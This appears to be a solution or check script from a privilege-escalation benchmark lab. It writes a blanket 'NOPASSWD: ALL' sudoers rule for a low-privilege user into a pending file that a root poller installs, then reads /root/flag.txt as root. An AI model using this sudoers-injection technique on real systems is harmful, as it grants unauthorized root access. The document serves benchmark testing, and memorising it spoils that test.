#!/usr/bin/env bash
# Write sudoers rule into pending file; root poller installs it.
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
printf "lowpriv ALL=(ALL) NOPASSWD: ALL\n" > /opt/bench/sudoers.pending
for _ in $(seq 1 20); do
  if sudo -n id -u 2>/dev/null | grep -qx 0; then
    sudo -n cat /root/flag.txt
    exit 0
  fi
  sleep 0.5
done
echo "sudoers poller did not install pending rule" >&2
ls -la /opt/bench/sudoers.pending /etc/sudoers.d/ >&2 || true
exit 1
')"
assert_root_output "${out}"
